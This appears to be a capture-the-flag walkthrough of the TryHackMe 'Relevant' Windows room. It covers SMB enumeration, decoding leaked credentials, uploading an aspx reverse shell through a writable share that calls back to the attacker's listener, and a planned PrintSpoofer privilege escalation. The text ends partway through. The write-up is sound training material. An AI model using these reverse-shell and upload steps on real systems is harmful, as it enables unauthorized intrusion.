[Relevant](https://tryhackme.com/room/relevant) is a medium rated widows room on TryHackMe by [TheMayor](https://tryhackme.com/p/TheMayor). Here contents of a share on the smb which can be accessed by anyone, is relfected to a webserver which is used to get a shell on the box as IIS user and SeImpersonatePrivilege was abused to get a system shell on the box.

There are a lot of ports open. So, lets start enumeration from SMB.

# SMB service on Port 445

## Trying Null authentication
### smbmap without username and password
```console
local@local:~/Documents/tryhackme/relevant$ smbmap -H 10.10.240.19
[+] Finding open SMB ports....
```
### smbmap with username and password
Nothing was returned. 
```console
local@local:~/Documents/tryhackme/relevant$ smbmap -H 10.10.240.19 -u anonymous -p anonymous
[+] Finding open SMB ports....
```
I always try the smbmap to list the shares because along with the share names, it also shows the permissions.

### Null authentication using smbclient
```console
local@local:~/Documents/tryhackme/relevant$ smbclient -N -L 10.10.240.19

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
SMB1 disabled -- no workgroup available
```
I have found **smbclient** to be the most reliable to list the shares, but it doesnot shows the read/write permissions for the current user.
Here **ADMIN\$**, **C\$** and **IPC$** are the default administrative shares and the only thing that is non default is the **nt4wrksv** share.
### Understanding the Default Shares
The \$ sign on the end of the shares means it is a hidden share and  are not visible from My computer on the device, but we can view them from the shared folders.
-   C\$ - This is the default drive share and by default C$ is always enabled
-   IPC\$ - The ipc$ share is a resource that shares the named pipes that are essential for communication between programs.
-   ADMIN\$ - The default systemroot or Windows directory.

We that we have found few shares, lets try to connect to the shares.

### Trying to connect to each shares
```console
local@local:~/Documents/tryhackme/relevant$ smbclient -N  \\\\10.10.240.19\\ADMIN$
tree connect failed: NT_STATUS_ACCESS_DENIED
local@local:~/Documents/tryhackme/relevant$ smbclient -N  \\\\10.10.240.19\\C$
tree connect failed: NT_STATUS_ACCESS_DENIED
local@local:~/Documents/tryhackme/relevant$ smbclient -N  \\\\10.10.240.19\\IPC$
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_INVALID_INFO_CLASS listing \*
smb: \> exit
local@local:~/Documents/tryhackme/relevant$ smbclient -N  \\\\10.10.240.19\\nt4wrksv
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jul 26 03:31:04 2020
  ..                                  D        0  Sun Jul 26 03:31:04 2020
  passwords.txt                       A       98  Sat Jul 25 21:00:33 2020

                7735807 blocks of size 4096. 4934467 blocks available
smb: \> 
```
Looking at the results we can connect to 2 shares,ie **IPC$** and **nt4wrksv** but not to 2 other shares. It is because we dont have enough permission. But we do have enough permission over share nt4wrksv and we can see a file called **passwords.txt**. We can mount the share to our device which will make it easier to work with.

### Mounting the share on local device
```console
local@local:~/Documents/tryhackme/relevant$ mkdir mnt
local@local:~/Documents/tryhackme/relevant$ sudo mount -t cifs //10.10.240.19/nt4wrksv mnt
Password for root@//10.10.240.19/nt4wrksv:                          
local@local:~/Documents/tryhackme/relevant$ ls -la mnt/
total 9
drwxr-xr-x 2 root     root     4096 Jul 26 03:31 .
drwxr-xr-x 5 local local 4096 Nov 13 09:36 ..
-rwxr-xr-x 1 root     root       98 Jul 25 21:00 passwords.txt
```
In this case we have mounted the share on our device. We could have just downloaded the file using `get passwords.txt` from inside the smb shell.

### Content of passwords.txt
```console
local@local:~/Documents/tryhackme/relevant$ cat passwords.txt 
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

### Decoded Content
```console
Bob:!P@$$W0rD!123
Bill:Juw4nnaM4n420696969!$$$
```
We get a bunch of username and passwords. So, lets try check if the credentials are valid.
### Using crackmapexec
```
local@local:~/Documents/tryhackme/relevant$ cat user 
Bob
Bill

local@local:~/Documents/tryhackme/relevant$ cat password
!P@$$W0rD!123
Juw4nnaM4n420696969!$$$
```
```console
local@local:~/Documents/tryhackme/relevant$ crackmapexec smb 10.10.240.19 -u user -p password
SMB         10.10.240.19    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.10.240.19    445    RELEVANT         [+] Relevant\Bob:!P@$$W0rD!123
```
CME shows that the credentials for Bob is valid. So lets try to list shares for user Bob.
### Listing shares using CME for user Bob
```console
local@local:~/Documents/tryhackme/relevant$ crackmapexec smb 10.10.240.19 -u user -p password --shares

SMB         10.10.240.19    445    RELEVANT         nt4wrksv        READ,WRITE
```
Looks like we have write permissions for the share **nt4wrksv**. But it is not over yet. If I specify some user that definitely doesnot exist like **this_user_doesnot_exist**, the output of the CME will be the following.

### Listing shares for user this_user_doesnot_exist

SMB         10.10.240.19    445    RELEVANT         nt4wrksv        READ,WRITE 
```
CME tells us that this is a valid credential and list the shares for us, but this user possibly can not exist and if it does the password cant be the one that we provided. What CME did was, it did the anonymous authentication for the users that does not exist. But it did tell that password of one of our user is incorrect and that might be valid user on the box ie **Bill**.
Since we have write  permission of this share, if there is any chance the content of this share is reflected on the webserver, we can put a aspx shell on this share and get code execution, as for linux we would have uploaded a php shell.

But I found nothing. So I checked whether the file passwords.txt or directory nt4wrksv exists manually.
```console
local@local:~/Documents/tryhackme/relevant$ curl http://10.10.126.3/nt4wrksv -i
HTTP/1.1 404 Not Found

```
And we get a 404.

Looking at the nmap all ports result we also have a port listening on 49663.

And it turned out it is also running a HTTP service. So I also ran wfuzz aganist this.

This time we find a new directory but with a little search, I found aspnet_client is a folder for "resources which must be served via HTTP, but are installed on a per-server basis, rather than a per-application basis". So it didnot seem something that the user might have created.

So the next step would be to check if the contents of the SMB service are reflected.
```console
local@local:~/Documents/tryhackme/relevant$ curl http://10.10.126.3:49663/passwords.txt -i
HTTP/1.1 404 Not Found
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Fri, 13 Nov 2020 04:33:27 GMT
Content-Length: 0
local@local:~/Documents/tryhackme/relevant$ curl http://10.10.126.3:49663/nt4wrksv/ -i
HTTP/1.1 200 OK
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Fri, 13 Nov 2020 04:34:21 GMT
Content-Length: 0
```
We get a 404 for file passwords.txt but get a 200 OK for the directory. We get exactly what we are looking for.

### Checking for the file inside the SMB share
```console
local@local:~/Documents/tryhackme/relevant$ curl http://10.10.126.3:49663/nt4wrksv/passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```
Now that the content of the SMB share is reflected on the webserver and also we have write permission on that share, lets copy an aspx shell on the mounted share.

## Shell as IIS 
### Aspx shell
```console
local@local:~/Documents/tryhackme/relevant$ cp /opt/aspx-reverse-shell/shell.aspx shell.aspx

```
You can find plenty of aspx shell on the internet. 

### Changing the content of the shell
```console
local@local:~/Documents/tryhackme/relevant$ ifconfig tun0 | grep -i 'inet ' | awk -F " " '{print $2}'
10.6.31.213
```
### Changed content
```aspx
    protected void Page_Load(object sender, EventArgs e)
    {
        String host = "10.6.31.213"; //CHANGE THIS
            int port = 9001; ////CHANGE THIS
                
        CallbackShell(host, port);
    }

```
We have changed the contents with our IP and the port that we will be listening on.

### Netcat listener on port 9001
```console
local@local:~/Documents/tryhackme/relevant$ rlwrap nc -nvlp 9001
Listening on 0.0.0.0 9001
```
And notice something different here. I am using rlwrap which can be installed from apt store. As on linux the returned shell would not have autocompletion or arrow keys functions so, we used to get a interactive shell using python or socat. Here using rlwrap we can get the functionality of the arrow keys only.

### Copying the shell inside mnt
```console
local@local:~/Documents/tryhackme/relevant$ sudo cp shell.aspx mnt/shell.aspx
[sudo] password for local: 
local@local:~/Documents/tryhackme/relevant$ ls -la mnt
total 25
drwxr-xr-x 2 root     root      4096 Nov 13 10:31 .
drwxr-xr-x 5 local local  4096 Nov 13 10:26 ..
-rwxr-xr-x 1 root     root        98 Jul 25 21:00 passwords.txt
-rwxr-xr-x 1 root     root     15970 Nov 13 10:31 shell.aspx
```
### Visiting the shell.aspx
```console
local@local:~/Documents/tryhackme/relevant$ curl http://10.10.126.3:49663/nt4wrksv/shell.aspx
```
We do not get ouptut and if we check the netcat listener, we get a shell back.

```console
local@local:~/Documents/tryhackme/relevant$ rlwrap nc -nvlp 9001
Listening on 0.0.0.0 9001

```
Here we are running as IIS user which is a service account on the windows box. It is similiar to www-data on the linux box. As we have a shell as iis, we can read the content of the inetpub directory which contains the content of the webserver. inetpub can be thought as the /var/www/html in the linux system.

# Privilege Escalation
The first thing that I do on the linux on is checking the sudoers entry using **sudo -l** and on the windows we have to first check the privilege assigned to the user that we are running as. Since we are running as IIS, it is likely that the service accounts have more privileges than the normal user account. Privileges are something that when enabled gives the low privilege user to do some privileged operaion.

### Listing privileges using whoami /priv
```console
c:\inetpub>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------
[]
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
We can see that few of the privileges are enabled for our user. And we can use the SeImpersonatePrivilege to get the shell as authority/system.
If you have having a very hard time with the privilege escalation on windows, you could solve [windows10privesc](https://tryhackme.com/room/windows10privesc) by [Tib3rius](https://tryhackme.com/p/Tib3rius) and [windowsprivescarena](https://tryhackme.com/room/windowsprivescarena) by [TCM](https://tryhackme.com/p/TCM).

# Getting a system shell
![3](/assets/images/thm/relevent/3.png)
So I will be using printSpoofer to get a system shell.

## Downloading the file to the box from [github](https://github.com/itm4n/PrintSpoofer)
```console

Lets upload this file differently  using smbclient.
```console
local@local:~/Documents/tryhackme/relevant$ smbclient -N \\\\10.10.184.223\\nt4wrksv
Try "help" to get a list of possible commands.
